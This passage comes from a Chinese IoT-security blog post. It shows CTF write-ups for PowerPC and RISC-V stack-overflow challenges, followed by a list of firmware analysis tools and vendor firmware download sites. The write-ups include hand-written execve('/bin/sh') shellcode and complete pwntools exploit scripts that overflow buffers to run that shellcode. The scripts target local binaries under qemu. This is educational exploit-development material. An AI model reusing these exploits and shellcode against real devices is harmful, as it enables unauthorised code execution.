)</span><br><span class="line">    printf_0(<span class="string">&quot;%x &quot;</span>, *((<span class="type">unsigned</span> __int8 *)&amp;v2[<span class="number">2</span>] + v2[<span class="number">0</span>]));</span><br><span class="line">  putchar_0(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>函数会将<code>buf</code>的内容通过<code>memcpy</code>复制到栈上，而<code>abStack136</code>只有104字节，很明显存在一个栈溢出漏洞。由于程序什么保护都没开，最简单的利用方法给x86的思路差不多，栈溢出覆盖返回地址，跳到可控内存段执行shellcode。程序对输入内容进行异或，处理方法有两个：1，将payload先进行一次异或再发送；2，<code>strlen</code>能够被<code>\x00</code>截断，截断后的内容不会经过异或。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/17/IoT%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98/image-20240419173750864.png"
                      alt="image-20240419173750864"
                ></p>
<p>栈溢出覆盖lr的偏移：<code>0x950-0x8b8=0x98=152</code>。</p>
<p>这一步没花太多时间，因为在程序唯一一次读取输入的地方，可以发现存放输入的<code>buf</code>是一个bss段的全局变量，程序没开PIE，地址可知。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000100D2B40                 .globl buf_0</span><br><span class="line">.bss:00000000100D2B40 buf_0:          .space 1                # DATA XREF: main_0+20↑o</span><br><span class="line">.bss:00000000100D2B40                                         # main_0+44↑o ...</span><br></pre></td></tr></table></figure></div>

<p>现在可以开始进行shellcode编写。</p>
<p>ppc的shellcode跟x86没什么差别，最终目标一样是<code>execve(&quot;/bin/sh&quot;, 0, 0)</code>，构造条件如下：</p>
<ol>
<li><code>r0</code>为syscall调用号，需要设为<code>0xb</code></li>
<li><code>r3</code>为参数一，需要指向<code>/bin/sh</code></li>
<li><code>r4</code>为参数二，需清0</li>
<li><code>r5</code>为参数三，需清0</li>
<li>在ppc中syscall使用<code>sc</code></li>
</ol>
<p>shellcode编写需要上面提到的各种指令集，不停查阅后终于写出shellcode，最终写出的shellcode如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor 3,3,3</span><br><span class="line">lis 3, 0x100d</span><br><span class="line">addi 3, 3, 0x2b64</span><br><span class="line">xor 4,4,4</span><br><span class="line">xor 5,5,5</span><br><span class="line">li 0, 11</span><br><span class="line">sc</span><br><span class="line">.long 0x6e69622f</span><br><span class="line">.long 0x68732f</span><br></pre></td></tr></table></figure></div>

<p>为了绕过异或，我直接在payload前面加了8字节的\x00，因此后面用的各种地址都需要+8。</p>
<p><strong>exp：</strong></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;ppc64&#x27;</span></span><br><span class="line">context.endian=<span class="string">&#x27;little&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;qemu-ppc64le&#x27;</span>, <span class="string">&#x27;-g&#x27;</span>, <span class="string">&#x27;8888&#x27;</span>, <span class="string">&#x27;./ppc&#x27;</span>])</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor 3,3,3   </span></span><br><span class="line"><span class="string">    lis 3, 0x100d  </span></span><br><span class="line"><span class="string">    addi 3, 3, 0x2b64</span></span><br><span class="line"><span class="string">    xor 4,4,4</span></span><br><span class="line"><span class="string">    xor 5,5,5</span></span><br><span class="line"><span class="string">    li 0, 11</span></span><br><span class="line"><span class="string">    sc</span></span><br><span class="line"><span class="string">    .long 0x6e69622f</span></span><br><span class="line"><span class="string">    .long 0x68732f</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">rop = p64(<span class="number">0</span>) + shellcode</span><br><span class="line">rop = rop.ljust(<span class="number">152</span>,<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">rop += p64(<span class="number">0x100D2B40</span>+<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;string\n&#x27;</span>,rop)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="RISC-V-PWN"><a href="#RISC-V-PWN" class="headerlink" title="RISC-V PWN"></a>RISC-V PWN</h2><h3 id="Stack-4"><a href="#Stack-4" class="headerlink" title="Stack"></a>Stack</h3><h4 id="harmoshell"><a href="#harmoshell" class="headerlink" title="harmoshell"></a>harmoshell</h4><div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">❯ checksec harmoshell</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/riskv_pwn/pwn/harmoshell/harmoshell&#x27;</span></span><br><span class="line">    Arch:     riscv64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure></div>

<p>riscv64小端序程序。</p>
<p>ghidra 分析。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">echo</span><span class="params">(longlong param_1)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  longlong lVar1;</span><br><span class="line">  <span class="type">char</span> **chunk_list;</span><br><span class="line">  <span class="type">char</span> *chunk;</span><br><span class="line">  <span class="type">int</span> file1;</span><br><span class="line">  <span class="type">ssize_t</span> rsize;</span><br><span class="line">  undefined4 extraout_var;</span><br><span class="line">  undefined4 extraout_var_00;</span><br><span class="line">  undefined4 extraout_var_01;</span><br><span class="line">  <span class="type">size_t</span> __nbytes;</span><br><span class="line">  <span class="type">char</span> *file;</span><br><span class="line">  undefined8 flag;</span><br><span class="line">  undefined auStack320 [<span class="number">264</span>];</span><br><span class="line"></span><br><span class="line">  lVar1 = *(longlong *)(param_1 + <span class="number">8</span>);</span><br><span class="line">  file = *(<span class="type">char</span> **)(lVar1 + <span class="number">8</span>);</span><br><span class="line">  file1 = <span class="built_in">strcmp</span>(file,<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (CONCAT44(extraout_var,file1) == <span class="number">0</span>) &#123;</span><br><span class="line">    flag = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    file1 = <span class="built_in">strcmp</span>(file,<span class="string">&quot;&gt;&gt;&quot;</span>);</span><br><span class="line">    flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (CONCAT44(extraout_var_00,file1) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">      FUN_00011490();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  file = *(<span class="type">char</span> **)(lVar1 + <span class="number">0x10</span>);</span><br><span class="line">  chunk_list = (<span class="type">char</span> **)&amp;gp0xfffffffffffffa60;</span><br><span class="line">  <span class="keyword">while</span> ((chunk = *chunk_list, chunk == (<span class="type">char</span> *)<span class="number">0x0</span> ||</span><br><span class="line">         (file1 = <span class="built_in">strcmp</span>(file,chunk), CONCAT44(extraout_var_01,file1) != <span class="number">0</span>))) &#123;</span><br><span class="line">    chunk_list = chunk_list + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (chunk_list == (<span class="type">char</span> **)&amp;gp0xfffffffffffffbe0) &#123;</span><br><span class="line">      __nbytes = <span class="number">0x200</span>;</span><br><span class="line">LAB_00011516:</span><br><span class="line">      rsize = read(<span class="number">0</span>,auStack320,__nbytes);</span><br><span class="line">      copy(*(undefined8 *)(*(longlong *)(param_1 + <span class="number">8</span>) + <span class="number">0x10</span>),auStack320,(longlong)rsize,flag);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __nbytes = *(<span class="type">size_t</span> *)(chunk + <span class="number">0x18</span>);</span><br><span class="line">  <span class="keyword">goto</span> LAB_00011516;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>exp：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;riscv64&#x27;</span></span><br><span class="line">context.endian=<span class="string">&#x27;little&#x27;</span></span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : io.recvuntil(x)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : io.recvuntil(x ,drop=<span class="literal">True</span>)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x : io.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : io.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : io.sendlineafter(a,b)</span><br><span class="line">gdba = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">cmd</span>):</span><br><span class="line">    ru(<span class="string">b&quot;$ &quot;</span>)</span><br><span class="line">    sl(cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">op_touch</span>(<span class="params">file_name</span>):</span><br><span class="line">    cmd = <span class="string">b&quot;touch &quot;</span>  + file_name</span><br><span class="line">    menu(cmd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">op_echo</span>(<span class="params">file_name, buf</span>):</span><br><span class="line">    cmd = <span class="string">b&quot;echo &gt; &quot;</span></span><br><span class="line">    cmd += file_name</span><br><span class="line">    menu(cmd)</span><br><span class="line">    sl(buf)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;./qemu-riscv64&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;./libs&#x27;</span>, <span class="string">&#x27;./harmoshell&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x30</span>):</span><br><span class="line">    op_touch(<span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x01\x11\x06\xec\x22\xe8\x13\x04\x21\x02\xb7\x67\x69\x6e\x93\x87\xf7\x22\x23\x30\xf4\xfe\xb7\x77\x68\x10\x33\x48\x08\x01\x05\x08\x72\x08\xb3\x87\x07\x41\x93\x87\xf7\x32\x23\x32\xf4\xfe\x93\x07\x04\xfe\x01\x46\x81\x45\x3e\x85\x93\x08\xd0\x0d\x73\x00\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">op_echo(<span class="string">b&quot;0&quot;</span>, shellcode)</span><br><span class="line"></span><br><span class="line">payload = shellcode</span><br><span class="line">payload += <span class="string">b&quot;A&quot;</span>*(<span class="number">0x138</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(<span class="number">0x0000000000025f10</span>)</span><br><span class="line">op_echo(<span class="built_in">str</span>(<span class="number">0x30</span>).encode(), payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>



<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里就不详细介绍了。</p>
<ol>
<li><p>binwalk</p>
</li>
<li><p>firmAE <del>下载最好挂个梯子</del></p>
</li>
<li><p>firmadyne</p>
</li>
<li><p>firmware-analysis-toolkit</p>
</li>
<li><p>qemu</p>
</li>
<li><p>firmwalker</p>
</li>
<li><p>firmware-mod-kit <a class="link"   target="_blank" rel="noopener" href="https://github.com/LovenSar/firmware-mod-kit-improveVer.git" >ubuntu20.04安装这个 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</li>
<li><p>……</p>
</li>
</ol>
<h1 id="获取固件"><a href="#获取固件" class="headerlink" title="获取固件"></a>获取固件</h1><p><strong>获取固件和提取固件这两个部分后面在漏洞挖掘和CVE复现时写写。</strong></p>
<ul>
<li><p>官网下载（有些存在加密，可以找一下中间版本，有可能存在解密脚本）</p>
</li>
<li><p>第三方网站</p>
</li>
<li><p>在线升级时抓取升级包的地址</p>
</li>
<li><p>售后获取</p>
</li>
<li><p>使用编程器从Flash中读取固件</p>
</li>
<li><p>通过调试接口，进入设备提取固件</p>
</li>
<li><p>使用逻辑分析仪获取固件</p>
</li>
<li><p>……</p>
</li>
</ul>
<h2 id="DLink"><a href="#DLink" class="headerlink" title="DLink"></a><strong>DLink</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://tsd.dlink.com.tw/ddwn" >https://tsd.dlink.com.tw/ddwn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://legacyfiles.us.dlink.com/" >https://legacyfiles.us.dlink.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Trendnet"><a href="#Trendnet" class="headerlink" title="Trendnet"></a><strong>Trendnet</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="http://download.trendnet.com/" >http://download.trendnet.com/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Tenda"><a href="#Tenda" class="headerlink" title="Tenda"></a><strong>Tenda</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.tendacn.com/products/routers.html" >https://www.tendacn.com/products/routers.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="TotoLink"><a href="#TotoLink" class="headerlink" title="TotoLink"></a><strong>TotoLink</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.totolink.net/home/index/menu_listtpl/listtpl/prod/id/26.html" >https://www.totolink.net/home/index/menu_listtpl/listtpl/prod/id/26.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="http://totolink.cn/home/index/menu_listtpl.html?listtpl=prod&id=26" >http://totolink.cn/home/index/menu_listtpl.html?listtpl=prod&amp;id=26 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="TP-Link"><a href="#TP-Link" class="headerlink" title="TP-Link"></a><strong>TP-Link</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://resource.tp-link.com.cn/?source=index" >https://resource.tp-link.com.cn/?source=index <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.tp-link.com/en/explore/wifi-router/" >https://www.tp-link.com/en/explore/wifi-router/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.tp-link.com.cn/" >https://www.tp-link.com.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Wavlink"><a href="#Wavlink" class="headerlink" title="Wavlink"></a><strong>Wavlink</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.wavlink.com/en_us/firmware.html" >https://www.wavlink.com/en_us/firmware.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="H3C"><a href="#H3C" class="headerlink" title="H3C"></a><strong>H3C</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.h3c.com/cn/Service/Document_Software/Software_Download/Consume_product/" >https://www.h3c.com/cn/Service/Document_Software/Software_Download/Consume_product/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="Cisco"><a href="#Cisco" class="headerlink" title="Cisco"></a><strong>Cisco</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://software.cisco.com/download/home" >https://software.cisco.com/download/home <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="NETGEAR"><a href="#NETGEAR" class="headerlink" title="NETGEAR"></a><strong>NETGEAR</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="http://www.netgear.cn/" >http://www.netgear.cn/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.netgear.com/support/download" >https://www.netgear.com/support/download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="DrayTek"><a href="#DrayTek" class="headerlink" title="DrayTek"></a><strong>DrayTek</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://fw.draytek.com.tw/" >https://fw.draytek.com.tw/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://www.draytek.com/products/vpn-routers/" >https://www.draytek.com/products/vpn-routers/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="锐捷"><a href="#锐捷" class="headerlink" title="锐捷"></a><strong>锐捷</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.ruijie.com.cn/fw/rj/" >https://www.ruijie.com.cn/fw/rj/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><a class="link"   target="_blank" rel="noopener" href="https://www.ruijienetworks.com/resources/products/1896-1897" >https://www.ruijienetworks.com/resources/products/1896-1897 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="萤石"><a href="#萤石" class="headerlink" title="萤石"></a><strong>萤石</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://service.ezviz.com/download" >https://service.ezviz.com/download <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="小米"><a href="#小米" class="headerlink" title="小米"></a><strong>小米</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="http://miwifi.com/miwifi_download.html" >http://miwifi.com/miwifi_download.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="ASUS"><a href="#ASUS" class="headerlink" title="ASUS"></a><strong>ASUS</strong></h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.asus.com.cn/support/" >https://www.asus.com.cn/support/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h1 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h1><p>也不在这里细讲了，复现CVE时再去戏写。</p>
<ul>
<li>binwalk</li>
<li>unsquashfs </li>
<li>dd</li>
<li>strings 查看信息</li>
<li>file</li>
<li>hexdump</li>
<li>fdisk</li>
<li>……</li>
</ul>
<h1 id="CVE实战篇"><a href="#CVE实战篇" class="headerlink" title="CVE实战篇"></a>CVE实战篇</h1><p>后面把自己和一些写的很好的师傅的blog挂在这里吧。</p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> IoT安全专题</li>
        <li><strong>Author:</strong> 韩乔落</li>
        <li><strong>Created at
                :</strong> 2023-10-17 10:42:44</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-09-20 13:28:41
            </li>
        
        <li>
            <strong>Link:</strong> https://jelasin.github.io/2023/10/17/IoT安全专题/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/IOT/">#IOT</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2023/10/17/%E5%A6%82%E4%BD%95%E9%BB%91%E6%8E%89%E4%B8%80%E9%A2%97%E5%8D%AB%E6%98%9F/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">如何黑掉一颗卫星</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2023/10/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6%E4%B8%AD%E7%9A%84%E6%95%B0%E5%AD%A6/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">计算机科学中的数学</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'jelasin/jelasin.github.io',
                'data-repo-id': 'R_kgDOKVydDA',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDOKVydDM4CZe2W',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'not-lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">IoT安全专题</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%89%A9%E8%81%94%E7%BD%91%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%85%B6%E6%9E%B6%E6%9E%84"><span class="nav-text">物联网介绍及其架构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%A9%E8%81%94%E7%BD%91-%E7%A1%AC%E4%BB%B6"><span class="nav-text">物联网 !&#x3D; 硬件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-text">介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%89%A9%E8%81%94%E7%BD%91%EF%BC%9F"><span class="nav-text">什么是物联网？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%93%AA%E9%87%8C%E4%BD%BF%E7%94%A8%E4%BA%86%E7%89%A9%E8%81%94%E7%BD%91%EF%BC%9F"><span class="nav-text">哪里使用了物联网？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%A9%E8%81%94%E7%BD%91%E6%9E%B6%E6%9E%84"><span class="nav-text">物联网架构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AB%98%E7%BA%A7%E8%A7%86%E5%9B%BE"><span class="nav-text">高级视图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%9F%E8%83%BD%E6%9E%B6%E6%9E%84"><span class="nav-text">功能架构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%86%E5%B1%82%E6%A8%A1%E5%9E%8B"><span class="nav-text">分层模型</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%89%A9%E8%81%94%E7%BD%91%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-text">物联网攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%A9%E8%81%94%E7%BD%91%E6%94%BB%E5%87%BB%E9%9D%A2-1"><span class="nav-text">物联网攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%A7%BB%E5%8A%A8%E5%BA%94%E7%94%A8"><span class="nav-text">移动应用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BA%91"><span class="nav-text">云</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%88%E7%AB%AF%E8%AE%BE%E5%A4%87"><span class="nav-text">终端设备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E4%BF%A1"><span class="nav-text">通信</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E6%94%BB%E5%87%BB%E9%9D%A2"><span class="nav-text">物联网设备攻击面</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8"><span class="nav-text">1. 数据存储</span></a></li><li class="nav-item nav-level-3"><a 